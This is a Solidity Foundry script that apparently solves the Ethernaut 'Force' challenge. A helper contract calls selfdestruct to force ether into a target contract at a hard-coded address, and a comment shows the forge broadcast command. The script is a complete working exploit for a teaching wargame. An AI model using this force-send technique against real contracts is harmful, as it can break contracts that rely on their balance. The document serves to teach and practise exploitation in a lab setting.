// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/7Force.sol";
import "forge-std/Script.sol";

contract DelegateAttack is Script {
    function run() public {
        vm.startBroadcast();
        Force targetContract = Force(0x6d5Ed0E906A6249E0424A6e0cbfA7C5755B385e1);
        console.log(address(targetContract).balance);
        bomb Bomb = new bomb();
        Bomb.attack{value: 1}(address(targetContract));
        console.log(address(targetContract).balance);
        vm.stopBroadcast();
    }
}

contract bomb { /*
                C.R.E.A.M
                  /\_/\   /
            ____/ $ $ \     $$$$
         /~____  =0= /
        (______)__^_^)
                 */
    function attack(address targetAddress) public payable {
        address payable target = payable(address(targetAddress));
        selfdestruct(target);
    }
}
// With multiple contract definitions in one script forge asks us to specify which one to run with "--tc"
// forge script script/7Force.s.sol -vvv --private-key $PKEY --rpc-url $RPC_URL --tc DelegateAttack;
